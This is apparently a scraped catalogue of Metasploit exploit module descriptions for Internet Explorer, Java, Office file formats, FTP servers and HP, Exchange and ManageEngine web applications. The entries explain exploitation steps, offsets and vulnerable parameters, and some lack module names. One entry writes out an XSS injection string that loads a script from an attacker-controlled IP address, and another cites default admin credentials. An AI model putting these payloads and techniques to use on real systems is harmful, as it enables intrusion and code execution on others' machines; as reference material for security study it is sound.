This module exploits a use-after-free vulnerability that currents targets Internet Explorer 9 on Windows 7, but the flaw should exist in versions 6/7/8/9/10/11. It was initially found in the wild in Japan, but other regions such as English, Chinese, Korean, etc, were targeted as well. The vulnerability is due to how the mshtml!CDoc::SetMouseCapture function handles a reference during an event. An attacker first can setup two elements, where the second is the child of the first, and then setup a onlosecapture event handler for the parent element. The onlosecapture event seems to require two setCapture() calls to trigger, one for the parent element, one for the child. When the setCapture() call for the child element is called, it finally triggers the event, which allows the attacker to cause an arbitrary memory release using document.write(), which in particular frees up a 0x54-byte memory. The exact size of this memory may differ based on the version of IE. After the free, an invalid reference will still be kept and pass on to more functions, eventuall this arrives in function MSHTML!CTreeNode::GetInterface, and causes a crash (or arbitrary code execution) when this function attempts to use this reference to call what appears to be a PrivateQueryInterface due to the offset (0x00). To mimic the same exploit found in the wild, this module will try to use the same DLL from Microsoft Office 2007 or 2010 to leverage the attack.

windows/browser/ie_unsafe_scripting
This exploit takes advantage of the "Initialize and script ActiveX controls not marked safe for scripting" setting within Internet Explorer. When this option is set, IE allows access to the WScript.Shell ActiveX control, which allows javascript to interact with the file system and run commands. This security flaw is not uncommon in corporate environments for the 'Intranet' or 'Trusted Site' zones. When set via domain policy, the most common registry entry to modify is HKLM\ Software\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201, which if set to '0' forces ActiveX controls not marked safe for scripting to be enabled for the Intranet zone. This module creates a javascript/html hybrid that will render correctly either via a direct GET http://msf-server/ or as a javascript include, such as in: http://intranet-server/xss.asp?id="><script%20src=http://10.10.10.10/ie_unsafe_script.js> </script>. IE Tabs, WScript and subsequent Powershell prompts all run as x86 even when run from an x64 iexplore.exe. By default, this module will not attempt to fire against IEs that come with Protected Mode enabled by default, because it can trigger a security prompt. However, if you are feeling brave, you can choose to ignore this restriction by setting the ALLOWPROMPT datastore option to true.

windows/browser/java_docbase_bof
This module exploits a flaw in the new plugin component of the Sun Java Runtime Environment before v6 Update 22. By specifying specific parameters to the new plugin, an attacker can cause a stack-based buffer overflow and execute arbitrary code. When the new plugin is invoked with a "launchjnlp" parameter, it will copy the contents of the "docbase" parameter to a stack-buffer using the "sprintf" function. A string of 396 bytes is enough to overflow the 256 byte stack buffer and overwrite some local variables as well as the saved return address. NOTE: The string being copied is first passed through the "WideCharToMultiByte". Due to this, only characters which have a valid localized multibyte representation are allowed. Invalid characters will be replaced with question marks ('?'). This vulnerability was originally discovered independently by both Stephen Fewer and Berend Jan Wever (SkyLined). Although exhaustive testing hasn't been done, all versions since version 6 Update 10 are believed to be affected by this vulnerability. This vulnerability was patched as part of the October 2010 Oracle Patch release.

A Midi block that contains a MIDI with a specially crafted controller event is used to trigger the vulnerability. When triggering the vulnerability "ebx" points to a fake event in the MIDI file which stores the shellcode. A "jmp ebx" from msvcr71.dll is used to make the exploit reliable over java updates.

This allows the injection of the -XXaltjvm option to load a jvm.dll from a remote UNC path into the java process. Thus an attacker can execute arbitrary code in the context of a browser user. This flaw was fixed in Oct. 2012 and affects JRE <= 1.6.35 and <= 1.7.07. In order for this module to work, it must be run as root on a server that does not serve SMB (In most cases, this means non-Windows hosts).

This module exploits an out-of-bounds access flaw in Firefox 7 and 8 (<= 8.0.1). The notification of nsSVGValue observers via nsSVGValue::NotifyObservers(x,y) uses a loop which can result in an out-of-bounds access to attacker-controlled memory. The mObserver ElementAt() function (which picks up pointers), does not validate if a given index is out of bound. If a custom observer of nsSVGValue is created, which removes elements from the original observer, and memory layout is manipulated properly, the ElementAt() function might pick up an attacker provided pointer, which can be leveraged to gain remote arbitrary code execution.

windows/browser/ms05_054_onload
This bug is triggered when the browser handles a JavaScript 'onLoad' handler in conjunction with an improperly initialized 'window()' JavaScript function. This exploit results in a call to an address lower than the heap. The javascript prompt() places our shellcode near where the call operand points to. We call prompt() multiple times in separate iframes to place our return address. We hide the prompts in a popup window behind the main window. We spray the heap a second time with our shellcode and point the return address to the heap. I use a fairly high address to make this exploit more reliable. IE will crash when the exploit completes. Also, please note that Internet Explorer must allow popups in order to continue exploitation.

This module exploits a use-after-free vulnerability within the DHTML behaviors functionality of Microsoft Internet Explorer versions 6 and 7. This bug was discovered being used in-the-wild and was previously known as the "iepeers" vulnerability. The name comes from Microsoft's suggested workaround to block access to the iepeers.dll file. According to Nico Waisman, "The bug itself is when trying to persist an object using the setAttribute, which end up calling VariantChangeTypeEx with both the source and the destination being the same variant. So if you send as a variant an IDISPATCH the algorithm will try to do a VariantClear of the destination before using it. This will end up on a call to PlainRelease which deref the reference and clean the object." NOTE: Internet Explorer 8 and Internet Explorer 5 are not affected.

windows/browser/ms10_042_helpctr_xss_cmd_exec
Help and Support Center is the default application provided to access online documentation for Microsoft Windows. Microsoft supports accessing help documents directly via URLs by installing a protocol handler for the scheme "hcp". Due to an error in validation of input to hcp:// combined with a local cross site scripting vulnerability and a specialized mechanism to launch the XSS trigger, arbitrary command execution can be achieved. On IE7 on XP SP2 or SP3, code execution is automatic. If WMP9 is installed, it can be used to launch the exploit automatically. If IE8 and WMP11, either can be used to launch the attack, but both pop dialog boxes asking the user if execution should continue. This exploit detects if non-intrusive mechanisms are available and will use one if possible. In the case of both IE8 and WMP11, the exploit defaults to using an iframe on IE8, but is configurable by setting the DIALOGMECH option to "none" or "player". This module creates a WebDAV service from which the payload is copied to the victim machine.

windows/browser/ms10_090_ie_css_clip
This module exploits a memory corruption vulnerability within Microsoft's HTML engine (mshtml). When parsing an HTML page containing a specially crafted CSS tag, memory corruption occurs that can lead arbitrary code execution. It seems like Microsoft code inadvertently increments a vtable pointer to point to an unaligned address within the vtable's function pointers. This leads to the program counter being set to the address determined by the address "[vtable+0x30+1]". The particular address depends on the exact version of the mshtml library in use. Since the address depends on the version of mshtml, some versions may not be exploitable. Specifically, those ending up with a program counter value within another module, in kernel space, or just not able to be reached with various memory spraying techniques. Also, since the address is not controllable, it is unlikely to be possible to use ROP to bypass non-executable memory protections.

The mshtml!CObjectElement is then freed from memory because it is invalid. However, the mshtml!CDisplay object for the page continues to keep a reference to the freed <object> and attempts to call a function on it, leading to the use-after-free.

windows/browser/ms12_004_midi
This module exploits a heap overflow vulnerability in the Windows Multimedia Library (winmm.dll). The vulnerability occurs when parsing specially crafted MIDI files. Remote code execution can be achieved by using the Windows Media Player ActiveX control. Exploitation is done by supplying a specially crafted MIDI file with specific events, causing the offset calculation being higher than what is available on the heap (0x400 allocated by WINMM!winmmAlloc), and then allowing us to either "inc al" or "dec al" a byte. This can be used to corrupt an array (CImplAry) we setup, and force the browser to confuse types from tagVARIANT objects, which leverages remote code execution under the context of the user. Note: At this time, for IE 8 target, msvcrt ROP is used by default. However, if you know your target's patch level, you may also try the 'MSHTML' advanced option for an info leak based attack. Currently, this module only supports two MSHTML builds: 8.0.6001.18702, which is often seen in a newly installed XP SP3. Or 8.0.6001.19120, which is patch level before the MS12-004 fix. Also, based on our testing, the vulnerability does not seem to trigger when the victim machine is operated via rdesktop.

This module exploits an integer overflow vulnerability on Internet Explorer. The vulnerability exists in the handling of the dashstyle.array length for vml shapes on the vgx.dll module. The exploit has been built and tested specifically against Windows 7 SP1 with Internet Explorer 8. It uses either JRE6 or an information leak (to ntdll) to bypass ASLR, and by default the info leak is used. To make sure the leak is successful, the ntdll version should be either v6.1.7601.17514 (the default dll version on a newly installed/unpatched Windows 7 SP1), or ntdll.dll v6.1.7601.17725 (installed after apply MS12-001). If the target doesn't have the version the exploit wants, it will refuse to attack by sending a fake 404 message (webpage not found). If you wish to try the JRE6 component instead to bypass ASLR, you can set the advanced datastore option to 'JRE6'. If JRE6 is chosen but the target doesn't have this particular component, the exploit will also refuse to attack by sending a 404 message.

windows/browser/ms13_055_canchor
In IE8 standards mode, it's possible to cause a use-after-free condition by first creating an illogical table tree, where a CPhraseElement comes after CTableRow, with the final node being a sub table element. When the CPhraseElement's outer content is reset by using either outerText or outerHTML through an event handler, this triggers a free of its child element (in this case, a CAnchorElement, but some other objects apply too), but a reference is still kept in function SRunPointer::SpanQualifier. This function will then pass on the invalid reference to the next functions, eventually used in mshtml!CElement::Doc when it's trying to make a call to the object's SecurityContext virtual function at offset +0x70, which results a crash. An attacker can take advantage of this by first creating an CAnchorElement object, let it free, and then replace the freed memory with another fake object. Successfully doing so may allow arbitrary code execution under the context of the user. This bug is specific to Internet Explorer 8 only. It was originally discovered by Jose Antonio Vazquez Gonzalez and reported to iDefense, but was discovered again by Orange Tsai at Hitcon 2013.

windows/browser/ms13_059_cflatmarkuppointer
This is a memory corruption bug found in Microsoft Internet Explorer. On IE 9, it seems to only affect certain releases of mshtml.dll, ranging from a newly installed IE9 (9.0.8112.16446), to 9.00.8112.16502 (July 2013 update). IE8 requires a different way to trigger the vulnerability, but not currently covered by this module. The issue is specific to the browser's IE7 document compatibility, which can be defined in X-UA-Compatible, and the content editable mode must be enabled. An "onmove" event handler is also necessary to be able to trigger the bug, and the event will be run twice before the crash. The first time is due to the position change of the body element, which is also when a MSHTML!CFlatMarkupPointer::`vftable' object is created during a "SelectAll" command, and this object will be used later on for the crash. The second onmove event seems to be triggered by a InsertButton (or Insert-whatever) command, which is also responsible for the free of object CFlatMarkupPointer during page rendering. The EnsureRecalcNotify() function will then still return an invalid reference to CFlatMarkupPointer (stored in EBX), and then passes this on to the next functions (GetLineInfo -> QIClassID). When this reference arrives in function QIClassID, an access violation finally occurs when the function is trying to call QueryInterface() with the bad reference, and this results a crash. Successful control of the freed memory may leverage arbitrary code execution under the context of the user. Note: It is also possible to see a different object being freed and used, doesn't always have to be CFlatMarkupPointer.

windows/browser/ms13_069_caret
This module exploits a use-after-free vulnerability found in Internet Explorer, specifically in how the browser handles the caret (text cursor) object. In IE's standards mode, the caret handling's vulnerable state can be triggered by first setting up an editable page with an input field, and then we can force the caret to update in an onbeforeeditfocus event by setting the body's innerHTML property. In this event handler, mshtml!CCaret::`vftable' can be freed using a document.write() function, however, mshtml!CCaret::UpdateScreenCaret remains unaware of this change, and still uses the same reference to the CCaret object. When the function tries to use this invalid reference to call a virtual function at offset 0x2c, it finally results a crash. Precise control of the freed object allows arbitrary code execution under the context of the user.

windows/browser/ms13_080_cdisplaypointer
This module exploits a vulnerability found in Microsoft Internet Explorer. It was originally found being exploited in the wild targeting Japanese and Korean IE8 users on Windows XP, around the same time frame as CVE-2013-3893, except this was kept out of the public eye by multiple research companies and the vendor until the October patch release. This issue is a use-after-free vulnerability in CDisplayPointer via the use of a "onpropertychange" event handler. To set up the appropriate buggy conditions, we first craft the DOM tree in a specific order, where a CBlockElement comes after the CTextArea element. If we use a select() function for the CTextArea element, two important things will happen: a CDisplayPointer object will be created for CTextArea, and it will also trigger another event called "onselect". The "onselect" event will allow us to set up for the actual event handler we want to abuse - the "onpropertychange" event. Since the CBlockElement is a child of CTextArea, if we do a node swap of CBlockElement in "onselect", this will trigger "onpropertychange". During "onpropertychange" event handling, a free of the CDisplayPointer object can be forced by using an "Unselect" (other approaches also apply), but a reference of this freed memory will still be kept by CDoc::ScrollPointerIntoView, specifically after the CDoc::GetLineInfo call, because it is still trying to use that to update CDisplayPointer's position. When this invalid reference arrives in QIClassID, a crash finally occurs due to accessing the freed memory. By controlling this freed memory, it is possible to achieve arbitrary code execution under the context of the user.

This module exploits a vulnerability on the CardSpaceClaimCollection class from the icardie.dll ActiveX control. The vulnerability exists while the handling of the CardSpaceClaimCollection object. CardSpaceClaimCollections stores a collection of elements on a SafeArray and keeps a size field, counting the number of elements on the collection. By calling the remove() method on an empty CardSpaceClaimCollection it is possible to underflow the length field, storing a negative integer. Later, a call to the add() method will use the corrupted length field to compute the address where write into the SafeArray data, allowing to corrupt memory with a pointer to controlled contents. This module achieves code execution by using VBScript as discovered in the wild on November 2013 to (1) create an array of html OBJECT elements, (2) create holes, (3) create a CardSpaceClaimCollection whose SafeArray data will reuse one of the holes, (4) corrupt one of the legit OBJECT elements with the described integer overflow and (5) achieve code execution by forcing the use of the corrupted OBJECT.

The module creates a .exp file that must be imported with ActiveFax Server. It must be imported with the default character set 'ECMA-94 / Latin 1 (ISO 8859)'. The module has been tested successfully on ActFax Server 4.32 over Windows XP SP3 and Windows 7 SP1. In the Windows XP case, when ActFax runs as a service, it will execute as SYSTEM.

windows/fileformat/ibm_pcm_ws
The IBM Personal Communications I-Series application WorkStation is susceptible to a stack-based buffer overflow vulnerability within file parsing in which data copied to a location in memory exceeds the size of the reserved destination area. The buffer is located on the runtime program stack. When the WorkStation file is opened it will reach the code path at 0x67575180 located in pcspref.dll which conducts string manipulation and validation on the data supplied in the WorkStation file. The application will first check if 'Profile' header exists and appends a dot with the next parameter within the file. It will then measure the character length of the header by calling strcspn with a dot as its null-terminated character. It will then write the header into memory and ensure the header ends with a NUL character. The parameter character array is passed to the strcpy() function. The application has declared a 52-element character array for the destination for strcpy function. The function does not perform bounds checking therefore, data can be written paste the end of the buffer variable resulting in corruption of adjacent variables including other local variables, program state information and function arguments. You will notice that the saved RETURN address at offset 0x6c is overwritten by the data written past the buffer. To ensure we can perform arbitrary code execution we must we provide a valid pointer at 0x74 which is used as an argument for the called function at 0x675751ED as an id file extension parameter. Once the caller regains control we will reach our RETURN. The Ret instruction will be used to pop the overwritten saved return address which was corrupted. This exploit has been written to bypass 2 mitigations DEP and ASLR on a Windows platform.

windows/fileformat/microsoft_windows_contact
This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Microsoft Windows. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The flaw is due to the processing of ".contact" files <c:Url> node param which takes an expected website value, however if an attacker references an executable file it will run that instead without warning instead of performing expected web navigation. This is dangerous and would be unexpected to an end user. Executable files can live in a sub-directory so when the ".contact" website link is clicked it traverses directories towards the executable and runs. Making matters worse is if the files are compressed then downloaded "mark of the web" (MOTW) may potentially not work as expected with certain archive utilitys. The ".\" chars allow directory traversal to occur in order to run the attackers supplied executable sitting unseen in the attackers directory. This advisory is a duplicate issue that currently affects Windows .VCF files, and released for the sake of completeness as it affects Windows .contact files as well.

All versions of Microsoft Office 2010, 2007, 2003, and XP prior to the release of the MS10-087 bulletin are vulnerable. This module does not attempt to exploit the vulnerability via Microsoft Outlook. The Microsoft Word RTF parser was only used by default in versions of Microsoft Word itself prior to Office 2007. With the release of Office 2007, Microsoft began using the Word RTF parser, by default, to handle rich-text messages within Outlook as well. It was possible to configure Outlook 2003 and earlier to use the Microsoft Word engine too, but it was not a default setting. It appears as though Microsoft Office 2000 is not vulnerable. It is unlikely that Microsoft will confirm or deny this since Office 2000 has reached its support cycle end-of-life.

windows/fileformat/ms14_060_sandworm
This module exploits a vulnerability found in Windows Object Linking and Embedding (OLE) allowing arbitrary code execution, publicly known as "Sandworm". Platforms such as Windows Vista SP2 all the way to Windows 8, Windows Server 2008 and 2012 are known to be vulnerable. However, based on our testing, the most reliable setup is on Windows platforms running Office 2013 and Office 2010 SP2. And please keep in mind that some other setups such as using Office 2010 SP1 might be less stable, and sometimes may end up with a crash due to a failure in the CPackage::CreateTempFileName function. This module will generate three files: an INF, a GIF, and a PPSX file. You are required to set up a SMB or Samba 3 server and host the INF and GIF there. Systems such as Ubuntu or an older version of Windows (such as XP) work best for this because they require little configuration to get going. The PPSX file is what you should send to your target. In detail, the vulnerability has to do with how the Object Packager 2 component (packager.dll) handles an INF file that contains malicious registry changes, which may be leveraged for code execution. First of all, Packager does not load the INF file directly. As an attacker, you can trick it to load your INF anyway by embedding the file path as a remote share in an OLE object. The packager will then treat it as a type of media file, and load it with the packager!CPackage::OLE2MPlayerReadFromStream function, which will download it with a CopyFileW call, save it in a temp folder, and pass that information for later. The exploit will do this loading process twice: first for a fake gif file that's actually the payload, and the second for the INF file. The packager will also look at each OLE object's XML Presentation Command, specifically the type and cmd property. In the exploit, "verb" media command type is used, and this triggers the packager!CPackage::DoVerb function. Also, "-3" is used as the fake gif file's cmd property, and "3" is used for the INF. When the cmd is "-3", DoVerb will bail. But when "3" is used (again, for the INF file), it will cause the packager to try to find appropriate handler for it, which will end up with C:\Windows\System32\infDefaultInstall.exe, and that will install/run the malicious INF file, and finally give us arbitrary code execution.

windows/fileformat/mswin_tiff_overflow
This module exploits a vulnerability found in Microsoft's Tagged Image File Format. It was originally discovered in the wild, targeting Windows XP and Windows Server 2003 users running Microsoft Office, specifically in the Middle East and South Asia region. The flaw is due to a DWORD value extracted from the TIFF file that is embedded as a drawing in Microsoft Office, and how it gets calculated with user-controlled inputs, and stored in the EAX register. The 32-bit register will run out of storage space to represent the large value, which ends up being 0, but it still gets pushed as a dwBytes argument (size) for a HeapAlloc call. The HeapAlloc function will allocate a chunk anyway with size 0, and the address of this chunk is used as the destination buffer of a memcpy function, where the source buffer is the EXIF data (an extended image format supported by TIFF), and is also user-controlled. A function pointer in the chunk returned by HeapAlloc will end up being overwritten by the memcpy function, and then later used in OGL!GdipCreatePath. By successfully controlling this function pointer, and the memory layout using ActiveX, it is possible to gain arbitrary code execution under the context of the user.

If an attacker convinces the victim to open a specially crafted (Office) document from a directory also containing the attacker's DLL file, it is possible to execute arbitrary code with the privileges of the target user. This can potentially result in the attacker taking complete control of the affected system.

windows/fileformat/visiwave_vwr_type
This module exploits a vulnerability found in VisiWave's Site Survey Report application. When processing .VWR files, VisiWaveReport.exe attempts to match a valid pointer based on the 'Type' property (valid ones include 'Properties', 'TitlePage', 'Details', 'Graph', 'Table', 'Text', 'Image'), but if a match isn't found, the function that's supposed to handle this routine ends up returning the input as a pointer, and later used in a CALL DWORD PTR [EDX+10] instruction. This allows attackers to overwrite it with any arbitrary value, and results code execution. A patch is available at visiwave.com; the fix is done by XORing the return value as null if no match is found, and then it is validated before use. NOTE: During installation, the application will register two file handles, VWS and VWR, which allows a victim user to 'double click' the malicious VWR file and execute code. This module was also built to bypass ASLR and DEP.

This module will attempt to extract a payload to the startup folder of the current user. It is limited such that we can only go back one folder. Therefore, for this exploit to work properly, the user must extract the supplied RAR file from one folder within the user profile folder (e.g. Desktop or Downloads). User restart is required to gain a shell.

windows/ftp/open_ftpd_wbem
This module exploits multiple vulnerabilities found in Open&Compact FTP server. The software contains an authentication bypass vulnerability and a arbitrary file upload vulnerability that allows a remote attacker to write arbitrary files to the file system as long as there is at least one user who has permission. Code execution can be achieved by first uploading the payload to the remote machine as an exe file, and then upload another mof file, which enables WMI (Management Instrumentation service) to execute the uploaded payload. Please note that this module currently only works for Windows before Vista.

windows/ftp/vermillion_ftpd_port
This module exploits an out-of-bounds array access in the Arcane Software Vermillion FTP server. By sending a specially crafted FTP PORT command, an attacker can corrupt stack memory and execute arbitrary code. This particular issue is caused by processing data bound by attacker controlled input while writing into a 4 byte stack buffer. Unfortunately, the writing that occurs is not a simple byte copy. Processing is done using a source ptr (p) and a destination pointer (q). The vulnerable function walks the input string and continues while the source byte is non-null. If a comma is encountered, the function increments the destination pointer. If an ascii digit [0-9] is encountered, the following occurs: *q = (*q * 10) + (*p - '0'); All other input characters are ignored in this loop. As a consequence, an attacker must craft input such that modifications to the current values on the stack result in usable values. In this exploit, the low two bytes of the return address are adjusted to point at the location of a 'call edi' instruction within the binary. This was chosen since 'edi' points at the source buffer when the function returns. NOTE: This server can be installed as a service using "vftpd.exe install". If so, the service does not restart automatically, giving an attacker only one attempt.

windows/http/exchange_ecp_dlp_policy
This vulnerability allows remote attackers to execute arbitrary code on affected installations of Exchange Server. Authentication is required to exploit this vulnerability. Additionally, the target user must have the "Data Loss Prevention" role assigned and an active mailbox. If the user is in the "Compliance Management" or greater "Organization Management" role groups, then they have the "Data Loss Prevention" role. Since the user who installed Exchange is in the "Organization Management" role group, they transitively have the "Data Loss Prevention" role. The specific flaw exists within the processing of the New-DlpPolicy cmdlet. The issue results from the lack of proper validation of user-supplied template data when creating a DLP policy. An attacker can leverage this vulnerability to execute code in the context of SYSTEM. Tested against Exchange Server 2016 CU19 on Windows Server 2016.

windows/http/exchange_ecp_viewstate
This module exploits a .NET serialization vulnerability in the Exchange Control Panel (ECP) web page. The vulnerability is due to Microsoft Exchange Server not randomizing the keys on a per-installation basis resulting in them using the same validationKey and decryptionKey values. With knowledge of these values, an attacker can craft a special ViewState to cause an OS command to be executed by NT_AUTHORITY\SYSTEM using .NET deserialization.

windows/http/flexdotnetcms_upload_exec
This module exploits an arbitrary file upload vulnerability in FlexDotnetCMS v1.5.8 and prior in order to execute arbitrary commands with elevated privileges. The module first tries to authenticate to FlexDotnetCMS via an HTTP POST request to `/login`. It then attempts to upload a random TXT file and subsequently uses the FlexDotnetCMS file editor to rename the TXT file to an ASP file. If this succeeds, the target is vulnerable and the ASP file is generated as a copy of the TXT file, which remains on the server. Next, the module sends another request to rename the TXT file to an ASP file, this time adding the payload. Finally, the module tries to execute the ASP payload via a simple HTTP GET request to `/media/uploads/asp_payload` Valid credentials for a FlexDotnetCMS user with permissions to use the FileManager are required. This module has been successfully tested against FlexDotnetCMS v1.5.8 running on Windows Server 2012.

The vulnerability exists in the UploadFiles() function from the MPAUploader.Uploader.1 control, loaded and used by the server. The function can be abused via directory traversal and null byte injection in order to achieve arbitrary file upload. In order to exploit successfully, a few conditions must be met. First, a writable location under the context of Internet Guest Account (IUSR_*) or Everyone is required. By default, this module will attempt to write to /hpmpa/userfiles/, but the WRITEWEBFOLDER option can be used to provide another writable path. Second, the writable path must also be readable by a browser, so this typically means a location under wwwroot. Finally, you cannot overwrite a file with the same name as the payload.

windows/http/hp_nnm_ovas
This module exploits a stack buffer overflow in HP OpenView Network Node Manager versions 7.53 and earlier. Specifically this vulnerability is caused by a failure to properly handle user supplied input within the HTTP request including headers and the actual URL GET request. Exploitation is tricky due to character restrictions. It was necessary to utilize a egghunter shellcode which was alphanumeric encoded by muts in the original exploit. If you plan on using exploit this for a remote shell, you will likely want to migrate to a different process as soon as possible. Any connections get reset after a short period of time. This is probably some timeout handling code that causes this.

windows/http/hp_nnm_ovbuildpath_textfile
This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53 prior to NNM_01213 without the SSRT100649 hotfix. By specifying a long 'textFile' argument when calling the 'webappmon.exe' CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code. The vulnerable code is within the "_OVBuildPath" function within "ov.dll". There are no stack cookies, so exploitation is achieved by overwriting the saved return address. The vulnerability is due to the use of the function "_OVConcatPath" which finally uses "strcat" in an insecure way. User controlled data is concatenated to a string which contains the OpenView installation path. To achieve reliable exploitation a directory traversal in OpenView5.exe (OSVDB 44359) is being used to retrieve OpenView logs and disclose the installation path. If the installation path cannot be guessed the default installation path is used.

This vulnerability is triggerable via either a GET or POST request. The buffer being written to is 1024 bytes in size. It is important to note that this vulnerability must be exploited by overwriting SEH. Otherwise, CVE-2010-1961 is triggered! The vulnerable code is within the "main" function within "ovwebsnmpsrv.exe" with a timestamp prior to April 7th, 2010. There are no stack cookies, so exploitation is easily achieved by overwriting SEH structures. There exists some unreliability when running this exploit. It is not completely clear why at this time, but may be related to OVWDB or session management. Also, on some attempts OV NNM may report invalid characters in the URL.

The vulnerable code is within a sub-function called from "main" within "ovwebsnmpsrv.exe" with a timestamp prior to April 7th, 2010. This function contains a 256 byte stack buffer which is passed to the "getProxiedStorageAddress" function within ovutil.dll. When processing the address results in an error, the buffer is overflowed in a call to sprintf_new. There are no stack cookies present, so exploitation is easily achieved by overwriting the saved return address. There exists some unreliability when running this exploit. It is not completely clear why at this time, but may be related to OVWDB or session management. Also, on some attempts OV NNM may report invalid characters in the URL. It is not clear what is causing this either.

windows/http/hp_nnm_ovwebsnmpsrv_uro
This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53 prior to NNM_01203. By specifying a long 'arg' parameter when executing the 'jovgraph.exe' CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code. The vulnerable code is within the option parsing function within "ovwebsnmpsrv.exe" with a timestamp prior to April 7th, 2010. Reaching the vulnerable code requires a 'POST' request with an 'arg' parameter that, when combined with some static text, exceeds 10240 bytes. The parameter must begin with a dash. It is important to note that this vulnerability must be exploited by overwriting SEH. This is since overflowing the buffer with controllable data always triggers an access violation when attempting to write static text beyond the end of the stack. Exploiting this issue is a bit tricky due to a restrictive character set. In order to accomplish arbitrary code execution, a double-backward jump is used in combination with the Alpha2 encoder.

This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53 prior to NNM_01203. By making a specially crafted HTTP request to the "snmpviewer.exe" CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code. The vulnerable code lies within a function within "snmpviewer.exe" with a timestamp prior to April 7th, 2010. This vulnerability is triggerable via either a GET or POST request. The request must contain 'act' and 'app' parameters which, when combined, total more than the 1024 byte stack buffer can hold. It is important to note that this vulnerability must be exploited by overwriting SEH. While the saved return address can be smashed, a function call that occurs before the function returns calls "exit".

This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53 prior to NNM_01207 or NNM_01206 without the SSRT100025 hotfix. By specifying a long 'sel' parameter when calling methods within the 'webappmon.exe' CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code. This vulnerability is not triggerable via a GET request due to limitations on the request size. The buffer being targeted is 16384 bytes in size. There are actually two adjacent buffers that both get overflowed (one into the other), and strcat is used. The vulnerable code is within the "execvp_nc" function within "ov.dll" prior to v 1.30.12.69. There are no stack cookies, so exploitation is easily achieved by overwriting the saved return address or SEH frame. This vulnerability might also be triggerable via other CGI programs, however this was not fully investigated.

This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53. By sending a request containing a cookie longer than 5120 bytes, an attacker can overflow a stack buffer and execute arbitrary code. The vulnerable code is within the OvWwwDebug function. The static-sized stack buffer is declared within this function. When the vulnerability is triggered, the stack trace looks like the following: #0 ... #1 sprintf_new(local_stack_buf, fmt, cookie); #2 OvWwwDebug(" HTTP_COOKIE=%s\n", cookie); #3 ?OvWwwInit@@YAXAAHQAPADPBD@Z(x, x, x); #4 sub_405ee0("nnm", "webappmon"); No validation is done on the cookie argument. There are no stack cookies, so exploitation is easily achieved by overwriting the saved return address or SEH frame. The original advisory detailed an attack vector using the "OvJavaLocale" cookie being passed in a request to "webappmon.exe". Further research shows that several different cookie values, as well as several different CGI applications, can be used. '

windows/http/icecast_header
This module exploits a buffer overflow in the header parsing of icecast versions 2.0.1 and earlier, discovered by Luigi Auriemma. Sending 32 HTTP headers will cause a write one past the end of a pointer array. On win32 this happens to overwrite the saved instruction pointer, and on linux (depending on compiler, etc) this seems to generally overwrite nothing crucial (read not exploitable). This exploit uses ExitThread(), this will leave icecast thinking the thread is still in use, and the thread counter won't be decremented. This means for each time your payload exits, the counter will be left incremented, and eventually the threadpool limit will be maxed. So you can multihit, but only till you fill the threadpool.

By log-in and abusing the default administrator's SQL query functionality, it's possible to write a WAR payload to disk and trigger an automatic deployment of this payload. This module has been tested successfully on OpManager v11.0 and v11.4-v11.6 for Windows.

windows/http/manageengine_adaudit_plus_authenticated_rce
This module exploits security issues in ManageEngine ADAudit Plus prior to 7006 that allow authenticated users to execute arbitrary code by creating a custom alert profile and leveraging its custom alert script component. The module first runs a few checks to test the provided credentials, retrieve the configured domain(s) and obtain the build number of the target ADAudit Plus server. If the credentials are valid and the target is vulnerable, the module creates an alert profile that will be triggered for any failed login attempt to the configured domain. For versions prior to build 7004, the payload is directly inserted in the custom alert script component of the alert profile. For versions 7004 and 7005, the module leverages an arbitrary file write vulnerability (CVE-2021-42847) to create a Powershell script in the alert_scripts directory that contains the payload. The name of this script is then provided as the value for the custom alert script component of the alert profile. This module requires valid credentials for an account with the privileges to create alert scripts. It has been successfully tested against ManageEngine ADAudit Plus builds 7003 and 7005 running on Windows Server 2012 R2. Successful exploitation will result in RCE as the user running ManageEngine ADAudit Plus, which will typically be the local administrator.

windows/http/manageengine_admanager_plus_cve_2023_29084_auth_cmd_injection
ManageEngine ADManager Plus prior to build 7181 is vulnerable to an authenticated command injection due to insufficient validation of user input when performing the ChangePasswordAction function before passing it into a string that is later used as an OS command to execute. By making a POST request to /api/json/admin/saveServerSettings with a params POST parameter containing a JSON array object that has a USERNAME or PASSWORD element containing a carriage return and newline, followed by the command the attacker wishes to execute, an attacker can gain RCE as the user running ADManager Plus, which will typically be the local administrator. Note that the attacker must be authenticated in order to send requests to /api/json/admin/saveServerSettings, so this vulnerability does require authentication to exploit. As this exploit modifies the HTTP proxy settings for the entire server, one cannot use fetch payloads with this exploit, since these will use HTTP connections that will be affected by the change in configuration.

windows/http/manageengine_adselfservice_plus_cve_2022_28810
This module exploits the "custom script" feature of ADSelfService Plus. The feature was removed in build 6122 as part of the patch for CVE-2022-28810. For purposes of this module, a "custom script" is arbitrary operating system command execution. This module uses an attacker provided "admin" account to insert the malicious payload into the custom script fields. When a user resets their password or unlocks their account, the payload in the custom script will be executed. The payload will be executed as SYSTEM if ADSelfService Plus is installed as a service, which we believe is the normal operational behavior. This is a passive module because user interaction is required to trigger the payload. This module also does not automatically remove the malicious code from the remote target. Use the "TARGET_RESET" operation to remove the malicious custom script when you are done. ADSelfService Plus uses default credentials of "admin":"admin"

This module exploits a vulnerability found in ManageEngine Desktop Central 9. When uploading a 7z file, the FileUploadServlet class does not check the user-controlled ConnectionId parameter in the FileUploadServlet class. This allows a remote attacker to inject a null bye at the end of the value to create a malicious file with an arbitrary file type, and then place it under a directory that allows server-side scripts to run, which results in remote code execution under the context of SYSTEM. Please note that by default, some ManageEngine Desktop Central versions run on port 8020, but older ones run on port 8040.

windows/http/mdaemon_worldclient_form2raw
